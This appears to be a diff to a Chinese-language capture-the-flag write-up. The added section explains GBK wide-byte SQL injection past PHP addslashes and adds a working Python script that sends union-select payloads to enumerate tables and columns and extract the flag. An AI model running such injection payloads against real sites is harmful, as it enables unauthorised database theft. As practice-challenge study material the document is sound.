@@ -156,6 +156,68 @@ if($_GET[id]) {
 curl http://chinalover.sinaapp.com/web11/sql.php?id=1024.1
 ```
 
+## [GBK Injection](http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1)
+
+题目的响应直接给出来SQL语句。查了下资料，GBK注入又叫宽字节注入；GBK注入的关键在于两点：
+
+- 后台代码自动对引号转义，比如PHP addslashes给`'` 和 `"` 加上反斜杠`\`；
+- 后台和MySQL之间的连接使用GBK编码传输数据。
+
+它的原理是：注入的内容需要包含一个范围在`[0x81, 0xfe]`的字符（这是GBK的第一字节，见[wiki](https://zh.wikipedia.org/wiki/%E6%B1%89%E5%AD%97%E5%86%85%E7%A0%81%E6%89%A9%E5%B1%95%E8%A7%84%E8%8C%83)）和（单/双）引号。因为上述两点的关系，第一字节和反斜杠会被MySQL解析为一个GBK编码的汉字，本应被转义的引号就可以发挥作用了。
+
+这里记录一下第一次手工注入，过程有亿点小激动 :laughing:
+
+```python
+# encoding=utf-8
+import time
+import requests
+from urllib.parse import unquote as u, quote as q
+
+# 把count(*)改成database()直接出schema的名字，不过这个名字在这里好像没啥用
+# 1. 当前schema有多少张表
+count_tables = """' union select 25252, count(*) from information_schema.tables where table_schema=database() -- a"""
+
+url = 'http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df' + q(count_tables)
+
+print(requests.get(url=url).text)
+
+# 有6张表
+# 2. 当前schema有哪些表
+for i in range(6):
+    get_table_names = f"""' union select 25252, table_name from information_schema.tables where table_schema=database() limit 1 offset {i} -- a"""
+    url = 'http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df' + q(get_table_names)
+
+    print(requests.get(url=url).text)
+
+    time.sleep(1)
+
+# 3. 当前schema一共有多少列
+count_columns = """' union select 25252, count(*) from information_schema.columns where table_schema=database() -- a"""
+
+url = 'http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df' + q(count_columns)
+
+print(requests.get(url=url).text)
+
+# 有12列
+# 4. 当前schema有哪些列
+for i in range(12):
+    get_table_names = f"""' union select 25252, table_name from information_schema.columns where table_schema=database() limit 1 offset {i} -- a"""
+    url = 'http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df' + q(get_table_names)
+
+    print(requests.get(url=url).text)
+
+    time.sleep(1)
+
+# 已经看到有两个列叫做flag了
+# 5. 拿到flag
+get_flag = """' union select 25252, flag from ctf4 -- a"""
+
+url = 'http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%81' + q(get_flag)
+
+print(requests.get(url=url).text)
+```
+
+
 ## [/x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)
 源代码要求1. 正则表达式开头到结尾只能包含1-9 2.同时包含`#biubiubiu`
 ```php
@@ -389,6 +451,9 @@ curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
     - appended chars in case of trimming
   - `union`
     - short circuit evaluation
+  - GBK injection
+    - [1st character](https://zh.wikipedia.org/wiki/%E6%B1%89%E5%AD%97%E5%86%85%E7%A0%81%E6%89%A9%E5%B1%95%E8%A7%84%E8%8C%83#%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F)
+    - [post](https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/) about php `addslashes` and mysql `character_set_client`
 - `curl`
   - post an array in form data via [`curl`](https://stackoverflow.com/a/22741771/8706476)
 - http
@@ -396,6 +461,8 @@ curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
     - `X-Forwarded-For`
     - `Client-Ip`
   - [percent encoding](https://stackoverflow.com/a/5007362/8706476) in urls or form data
+    - python3: [urllib.parse.quote](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.quote) and [urllib.parse.unquote](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.unquote)
+    - white space " ": `%20`
     - null byte "\x00": `%00`
     - pound sign "#": `%23`
     - single quote "'": `%27`
